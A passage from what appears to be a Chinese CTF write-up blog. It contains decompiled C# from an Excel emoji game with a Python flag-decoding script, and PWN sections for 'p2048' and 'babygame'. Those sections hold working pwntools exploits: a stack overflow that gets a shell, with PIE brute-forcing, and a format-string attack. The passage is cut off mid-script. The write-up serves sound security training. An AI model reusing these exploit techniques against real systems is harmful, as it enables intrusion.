class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs c#"><span class="hljs-comment">// Emoji_Connect.Game</span><br><span class="hljs-comment">// Token: 0x06000003 RID: 3 RVA: 0x0000AC44 File Offset: 0x00008E44</span><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">check</span>()</span><br>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">48</span>; i++)<br>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">48</span>; j++)<br>&#123;<br><span class="hljs-keyword">if</span> (Game.&lt;&gt;o__7.&lt;&gt;p__2 == <span class="hljs-literal">null</span>)<br>&#123;<br>Game.&lt;&gt;o__7.&lt;&gt;p__2 = CallSite&lt;Func&lt;CallSite, <span class="hljs-built_in">object</span>, <span class="hljs-built_in">bool</span>&gt;&gt;.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, <span class="hljs-keyword">typeof</span>(Game), <span class="hljs-keyword">new</span> CSharpArgumentInfo[]<br>&#123;<br>CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, <span class="hljs-literal">null</span>)<br>&#125;));<br>&#125;<br>Func&lt;CallSite, <span class="hljs-built_in">object</span>, <span class="hljs-built_in">bool</span>&gt; target = Game.&lt;&gt;o__7.&lt;&gt;p__2.Target;<br>CallSite &lt;&gt;p__ = Game.&lt;&gt;o__7.&lt;&gt;p__2;<br><span class="hljs-keyword">if</span> (Game.&lt;&gt;o__7.&lt;&gt;p__1 == <span class="hljs-literal">null</span>)<br>&#123;<br>Game.&lt;&gt;o__7.&lt;&gt;p__1 = CallSite&lt;Func&lt;CallSite, <span class="hljs-built_in">object</span>, <span class="hljs-built_in">string</span>, <span class="hljs-built_in">object</span>&gt;&gt;.Create(Binder.BinaryOperation(CSharpBinderFlags.None, ExpressionType.NotEqual, <span class="hljs-keyword">typeof</span>(Game), <span class="hljs-keyword">new</span> CSharpArgumentInfo[]<br>&#123;<br>CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, <span class="hljs-literal">null</span>),<br>CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, <span class="hljs-literal">null</span>)<br>&#125;));<br>&#125;<br>Func&lt;CallSite, <span class="hljs-built_in">object</span>, <span class="hljs-built_in">string</span>, <span class="hljs-built_in">object</span>&gt; target2 = Game.&lt;&gt;o__7.&lt;&gt;p__1.Target;<br>CallSite &lt;&gt;p__2 = Game.&lt;&gt;o__7.&lt;&gt;p__1;<br><span class="hljs-keyword">if</span> (Game.&lt;&gt;o__7.&lt;&gt;p__0 == <span class="hljs-literal">null</span>)<br>&#123;<br>Game.&lt;&gt;o__7.&lt;&gt;p__0 = CallSite&lt;Func&lt;CallSite, <span class="hljs-built_in">object</span>, <span class="hljs-built_in">object</span>&gt;&gt;.Create(Binder.GetMember(CSharpBinderFlags.None, <span class="hljs-string">&quot;Value&quot;</span>, <span class="hljs-keyword">typeof</span>(Game), <span class="hljs-keyword">new</span> CSharpArgumentInfo[]<br>&#123;<br>CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, <span class="hljs-literal">null</span>)<br>&#125;));<br>&#125;<br><span class="hljs-keyword">if</span> (target(&lt;&gt;p__, target2(&lt;&gt;p__2, Game.&lt;&gt;o__7.&lt;&gt;p__0.Target(Game.&lt;&gt;o__7.&lt;&gt;p__0, <span class="hljs-keyword">this</span>.sheet1.Cells[i + <span class="hljs-number">1</span>, j + <span class="hljs-number">1</span>]), <span class="hljs-string">&quot;\ud83d\udca5&quot;</span>)))<br>&#123;<br><span class="hljs-keyword">return</span>;<br>&#125;<br>&#125;<br>&#125;<br>MessageBox.Show(Encoding.ASCII.GetString((<span class="hljs-keyword">from</span> n <span class="hljs-keyword">in</span> <span class="hljs-keyword">this</span>.<span class="hljs-function">number</span><br><span class="hljs-function"><span class="hljs-title">select</span> (<span class="hljs-params"><span class="hljs-built_in">byte</span></span>)n).<span class="hljs-title">ToArray</span>&lt;<span class="hljs-title">byte</span>&gt;()))</span>;<br>&#125; <span class="hljs-comment">// 发现有一个number成员最后会作为flag显示</span><br><br><span class="hljs-keyword">this</span>.number = <span class="hljs-keyword">new</span> <span class="hljs-built_in">int</span>[]<br>&#123;<span class="hljs-number">25588</span>,<span class="hljs-number">31114</span>,<span class="hljs-number">28727</span>,<span class="hljs-number">26722</span>,<span class="hljs-number">24948</span>,<span class="hljs-number">25135</span>,<span class="hljs-number">25480</span>,<span class="hljs-number">29029</span>,<span class="hljs-number">23025</span>,<span class="hljs-number">25775</span>,<span class="hljs-number">15411</span>,<span class="hljs-number">25423</span>,<span class="hljs-number">25202</span>,<span class="hljs-number">30031</span>,<span class="hljs-number">27380</span>,<span class="hljs-number">30734</span>,<span class="hljs-number">25054</span>,<span class="hljs-number">25109</span>,<span class="hljs-number">20741</span>,<span class="hljs-number">28568</span>,<span class="hljs-number">28802</span>,<span class="hljs-number">24591</span>,<span class="hljs-number">26063</span>,<span class="hljs-number">30940</span>,<span class="hljs-number">30375</span>,<span class="hljs-number">19411</span>,<span class="hljs-number">29573</span>,<span class="hljs-number">20845</span>,<span class="hljs-number">27232</span>,<span class="hljs-number">26743</span>,<span class="hljs-number">25779</span>,<span class="hljs-number">24986</span>,<span class="hljs-number">31498</span>,<span class="hljs-number">30978</span>,<span class="hljs-number">22945</span>,<span class="hljs-number">26563</span>,<span class="hljs-number">35012</span>,<span class="hljs-number">29994</span>,<span class="hljs-number">27016</span>,<span class="hljs-number">29535</span>,<span class="hljs-number">21342</span>,<span class="hljs-number">26573</span>,<span class="hljs-number">27569</span>,<span class="hljs-number">25408</span>,<span class="hljs-number">31567</span>,<span class="hljs-number">25503</span>,<span class="hljs-number">21385</span>,<span class="hljs-number">27207</span>&#125;; <span class="hljs-comment">//number的初始值</span><br><br><span class="hljs-comment">// Emoji_Connect.Game</span><br><span class="hljs-comment">// Token: 0x06000002 RID: 2 RVA: 0x0000A5B0 File Offset: 0x000087B0</span><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Select_Unit</span>(<span class="hljs-params">Microsoft.Office.Interop.Excel.Range Target</span>)</span><br>&#123;<br>...<br><span class="hljs-keyword">if</span> (target(&lt;&gt;p__, arg5))<br>&#123;<br><span class="hljs-keyword">if</span> (Game.&lt;&gt;o__6.&lt;&gt;p__13 == <span class="hljs-literal">null</span>)<br>&#123;<br>Game.&lt;&gt;o__6.&lt;&gt;p__13 = CallSite&lt;Func&lt;CallSite, <span class="hljs-built_in">object</span>, <span class="hljs-built_in">bool</span>&gt;&gt;.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, <span class="hljs-keyword">typeof</span>(Game), <span class="hljs-keyword">new</span> CSharpArgumentInfo[]<br>&#123;<br>CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, <span class="hljs-literal">null</span>)<br>&#125;));<br>&#125;<br>Func&lt;CallSite, <span class="hljs-built_in">object</span>, <span class="hljs-built_in">bool</span>&gt; target6 = Game.&lt;&gt;o__6.&lt;&gt;p__13.Target;<br>CallSite &lt;&gt;p__6 = Game.&lt;&gt;o__6.&lt;&gt;p__13;<br><span class="hljs-keyword">if</span> (Game.&lt;&gt;o__6.&lt;&gt;p__12 == <span class="hljs-literal">null</span>)<br>&#123;<br>Game.&lt;&gt;o__6.&lt;&gt;p__12 = CallSite&lt;Func&lt;CallSite, <span class="hljs-built_in">object</span>, <span class="hljs-built_in">object</span>, <span class="hljs-built_in">object</span>&gt;&gt;.Create(Binder.BinaryOperation(CSharpBinderFlags.None, ExpressionType.Equal, <span class="hljs-keyword">typeof</span>(Game), <span class="hljs-keyword">new</span> CSharpArgumentInfo[]<br>&#123;<br>CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, <span class="hljs-literal">null</span>),<br>CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, <span class="hljs-literal">null</span>)<br>&#125;));<br>&#125;<br><span class="hljs-keyword">if</span> (target6(&lt;&gt;p__6, Game.&lt;&gt;o__6.&lt;&gt;p__12.Target(Game.&lt;&gt;o__6.&lt;&gt;p__12, list[<span class="hljs-number">0</span>].get_Value(Type.Missing), list[<span class="hljs-number">1</span>].get_Value(Type.Missing))))<br>&#123;<br><span class="hljs-keyword">if</span> (Game.&lt;&gt;o__6.&lt;&gt;p__14 == <span class="hljs-literal">null</span>)<br>&#123;<br>Game.&lt;&gt;o__6.&lt;&gt;p__14 = CallSite&lt;Func&lt;CallSite, <span class="hljs-built_in">object</span>, <span class="hljs-built_in">string</span>&gt;&gt;.Create(Binder.Convert(CSharpBinderFlags.None, <span class="hljs-keyword">typeof</span>(<span class="hljs-built_in">string</span>), <span class="hljs-keyword">typeof</span>(Game)));<br>&#125;<br><span class="hljs-built_in">int</span>[] array = (<span class="hljs-keyword">from</span> c <span class="hljs-keyword">in</span> Game.&lt;&gt;o__6.&lt;&gt;p__14.Target(Game.&lt;&gt;o__6.&lt;&gt;p__14, list[<span class="hljs-number">1</span>].get_Value(Type.Missing))<br><span class="hljs-keyword">select</span> (<span class="hljs-built_in">int</span>)c).ToArray&lt;<span class="hljs-built_in">int</span>&gt;();<br><span class="hljs-built_in">int</span> num = (array[<span class="hljs-number">0</span>] - <span class="hljs-number">55296</span>) * <span class="hljs-number">1024</span> + array[<span class="hljs-number">1</span>] - <span class="hljs-number">56320</span> + <span class="hljs-number">65536</span> - <span class="hljs-number">128512</span>;<br><span class="hljs-keyword">this</span>.number[num] -= (list[<span class="hljs-number">1</span>].Row - <span class="hljs-number">1</span>) * (list[<span class="hljs-number">1</span>].Column - <span class="hljs-number">1</span>);<br><span class="hljs-keyword">this</span>.number[num] -= (list[<span class="hljs-number">0</span>].Row - <span class="hljs-number">1</span>) * (list[<span class="hljs-number">0</span>].Column - <span class="hljs-number">1</span>);<br>list[<span class="hljs-number">0</span>].set_Value(Type.Missing, list[<span class="hljs-number">1</span>].set_Value(Type.Missing, <span class="hljs-string">&quot;\ud83d\udca5&quot;</span>));<br>&#125;<br>&#125;<br><span class="hljs-keyword">this</span>.check();<br>&#125; <span class="hljs-comment">// 这里将会使用被消除的两个格子的内容中的utf-16le字符中的两个字符,进行运算之后得到索引值</span><br>  <span class="hljs-comment">// 然后使用number数组中对应索引值处的内容减去 两个格子的坐标(x*y)</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">根据分析写出解密代码</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br>flag=[<span class="hljs-number">25588</span>,<span class="hljs-number">31114</span>,<span class="hljs-number">28727</span>,<span class="hljs-number">26722</span>,<span class="hljs-number">24948</span>,<span class="hljs-number">25135</span>,<span class="hljs-number">25480</span>,<span class="hljs-number">29029</span>,<span class="hljs-number">23025</span>,<span class="hljs-number">25775</span>,<span class="hljs-number">15411</span>,<span class="hljs-number">25423</span>,<span class="hljs-number">25202</span>,<span class="hljs-number">30031</span>,<span class="hljs-number">27380</span>,<span class="hljs-number">30734</span>,<span class="hljs-number">25054</span>,<span class="hljs-number">25109</span>,<span class="hljs-number">20741</span>,<span class="hljs-number">28568</span>,<span class="hljs-number">28802</span>,<span class="hljs-number">24591</span>,<span class="hljs-number">26063</span>,<span class="hljs-number">30940</span>,<span class="hljs-number">30375</span>,<span class="hljs-number">19411</span>,<span class="hljs-number">29573</span>,<span class="hljs-number">20845</span>,<span class="hljs-number">27232</span>,<span class="hljs-number">26743</span>,<span class="hljs-number">25779</span>,<span class="hljs-number">24986</span>,<span class="hljs-number">31498</span>,<span class="hljs-number">30978</span>,<span class="hljs-number">22945</span>,<span class="hljs-number">26563</span>,<span class="hljs-number">35012</span>,<span class="hljs-number">29994</span>,<span class="hljs-number">27016</span>,<span class="hljs-number">29535</span>,<span class="hljs-number">21342</span>,<span class="hljs-number">26573</span>,<span class="hljs-number">27569</span>,<span class="hljs-number">25408</span>,<span class="hljs-number">31567</span>,<span class="hljs-number">25503</span>,<span class="hljs-number">21385</span>,<span class="hljs-number">27207</span>]<br>array=[[<span class="hljs-literal">None</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x30</span>)] <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x30</span>)]<br>array[<span class="hljs-number">0</span>][ <span class="hljs-number">0</span>] = <span class="hljs-string">&quot;\ud83d\ude08&quot;</span><br>...<br>array[<span class="hljs-number">47</span>][ <span class="hljs-number">47</span>] = <span class="hljs-string">&quot;\ud83d\ude25&quot;</span><br><br><span class="hljs-keyword">for</span> i,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(array):<br>    <span class="hljs-keyword">for</span> j,v1 <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(v):<br>        arr0,arr1=[<span class="hljs-built_in">ord</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> v1]<br>        num= (arr0 - <span class="hljs-number">55296</span>) * <span class="hljs-number">1024</span> + arr1 - <span class="hljs-number">56320</span> + <span class="hljs-number">65536</span> - <span class="hljs-number">128512</span><br>        <br>        <span class="hljs-built_in">print</span>(arr0,arr1,num)<br>        flag[num] -= (j ) * (i )<br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(flag))<br></code></pre></td></tr></table></figure><h2 id="PWN">PWN</h2><h3 id="p2048">p2048</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">game</span><span class="hljs-params">(<span class="hljs-type">int</span> a1)</span><br>&#123;<br>  <span class="hljs-type">char</span> *i; <span class="hljs-comment">// edi</span><br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">bool</span> v3; <span class="hljs-comment">// zf</span><br>  <span class="hljs-type">char</span> v4; <span class="hljs-comment">// al</span><br>  <span class="hljs-type">char</span> v5; <span class="hljs-comment">// [esp+7h] [ebp-41Dh]</span><br>  <span class="hljs-type">char</span> v6; <span class="hljs-comment">// [esp+8h] [ebp-41Ch]</span><br>  <span class="hljs-type">char</span> v7[<span class="hljs-number">1048</span>]; <span class="hljs-comment">// [esp+Ch] [ebp-418h] BYREF</span><br><br>  <span class="hljs-built_in">memset</span>(v7, <span class="hljs-number">0</span>, <span class="hljs-number">0x400</span>u);<br>  <span class="hljs-keyword">for</span> ( i = v7; ; *(i - <span class="hljs-number">1</span>) = v5 )<br>  &#123;<br>    result = getchar();<br>    v6 = result;<br>    v5 = result;<br>    <span class="hljs-keyword">if</span> ( (_BYTE)result == <span class="hljs-number">0xFF</span> )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">if</span> ( (_BYTE)result != <span class="hljs-number">68</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( (<span class="hljs-type">char</span>)result &lt;= <span class="hljs-number">68</span> )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( (_BYTE)result == <span class="hljs-number">66</span> )<br>          <span class="hljs-keyword">goto</span> LABEL_18;<br>        <span class="hljs-keyword">if</span> ( (<span class="hljs-type">char</span>)result &lt;= <span class="hljs-number">66</span> )<br>        &#123;<br>          v3 = (_BYTE)result == <span class="hljs-number">65</span>;<br>LABEL_14:<br>          <span class="hljs-keyword">if</span> ( !v3 )<br>            <span class="hljs-keyword">goto</span> LABEL_22;<br>          v4 = moveUp(a1, &amp;score);<br>          <span class="hljs-keyword">goto</span> LABEL_19;<br>        &#125;<br>LABEL_17:<br>        v4 = moveRight(a1, &amp;score);<br>        <span class="hljs-keyword">goto</span> LABEL_19;<br>      &#125;<br>      <span class="hljs-keyword">if</span> ( (_BYTE)result == <span class="hljs-number">100</span> )<br>        <span class="hljs-keyword">goto</span> LABEL_17;<br>      <span class="hljs-keyword">if</span> ( (<span class="hljs-type">char</span>)result &gt; <span class="hljs-number">100</span> )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( (_BYTE)result != <span class="hljs-number">115</span> )<br>        &#123;<br>          v3 = (_BYTE)result == <span class="hljs-number">119</span>;<br>          <span class="hljs-keyword">goto</span> LABEL_14;<br>        &#125;<br>LABEL_18:<br>        v4 = moveDown(a1, &amp;score);<br>        <span class="hljs-keyword">goto</span> LABEL_19;<br>      &#125;<br>      <span class="hljs-keyword">if</span> ( (_BYTE)result != <span class="hljs-number">97</span> )<br>        <span class="hljs-keyword">goto</span> LABEL_22;<br>    &#125;<br>    v4 = moveLeft(a1, &amp;score);<br>LABEL_19:<br>    <span class="hljs-keyword">if</span> ( v4 )<br>    &#123;<br>      drawBoard(a1, score);<br>      addRandom(a1);<br>      drawBoard(a1, score);<br>      checkWin(a1, v7);<br>      <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)gameEnded(a1) )<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;         GAME OVER          &quot;</span>);<br>    &#125;<br>LABEL_22:<br>    <span class="hljs-keyword">if</span> ( v6 == <span class="hljs-number">113</span> )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;        QUIT? (y/n)         &quot;</span>);<br>      result = getchar();<br>      v5 = result;<br>      <span class="hljs-keyword">if</span> ( (_BYTE)result == <span class="hljs-number">121</span> )<br>        <span class="hljs-keyword">return</span> result;<br>      drawBoard(a1, score);<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( v5 == <span class="hljs-number">114</span> )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;       RESTART? (y/n)       &quot;</span>);<br>      v5 = getchar();<br>      <span class="hljs-keyword">if</span> ( v5 == <span class="hljs-number">121</span> )<br>      &#123;<br>        initBoard(a1);<br>        score = <span class="hljs-number">0</span>;<br>      &#125;<br>      drawBoard(a1, score);<br>    &#125;<br>    ++i;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125; <span class="hljs-comment">// 存在一个死循环,可以一直读取输入的字符,并写入栈中</span><br>    <span class="hljs-comment">//所以这里可以使用栈溢出,来获取shell</span><br>    <span class="hljs-comment">//不过在测试时,发现2048的方阵也在栈中,</span><br>    <span class="hljs-comment">// 那么就可以直接用栈溢出将2048方阵中的数据都修改为10,这表示1024,这样在移动之后就可以得到2048</span><br>    <span class="hljs-comment">// 这样在执行checkWin之后就会触发win函数,就可以获取shell</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">通过修改2048方阵,getshell</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=process(<span class="hljs-string">&#x27;./p2048&#x27;</span>)<br>pause()<br><br>p.send(<span class="hljs-string">&#x27;\x0a&#x27;</span>*<span class="hljs-number">542</span>*<span class="hljs-number">2</span>)<br>p.send(<span class="hljs-string">&#x27;\x0a&#x27;</span>*<span class="hljs-number">16</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">因为程序开启了PIE保护,所以需要爆破</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    p=process(<span class="hljs-string">&#x27;./p2048&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">1048</span>+<span class="hljs-string">b&#x27;bbbb&#x27;</span>+p16(<span class="hljs-number">0xde60</span>))<br>        p.send(<span class="hljs-string">b&#x27;qy&#x27;</span>)<br>        p.sendline(<span class="hljs-string">&#x27;ls&#x27;</span>)<br>    <span class="hljs-keyword">except</span>:<br>        p.close()<br>    p.interactive()<br><br></code></pre></td></tr></table></figure><h3 id="babygame">babygame</h3><p>当获得了足够多的分数时就可以构造足够多次数的格式化字符串,以修改某个地址处的数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> boom <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> CDLL<br><span class="hljs-keyword">import</span> sys<br>dll=CDLL(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>():<br>    base=<span class="hljs-string">b&quot;abcdefghijklmnopqrstuvwxyz&quot;</span><br>    dll.srand(dll.time(<span class="hljs-number">0</span>))<br>    res=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        res.append(base[dll.rand()%<span class="hljs-number">26</span>])<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(res)<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">game</span>(<span class="hljs-params"><span class="hljs-built_in">round</span>=<span class="hljs-number">3</span></span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;level : &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">round</span>):<br>        i=check()<br>        p.sendlineafter(<span 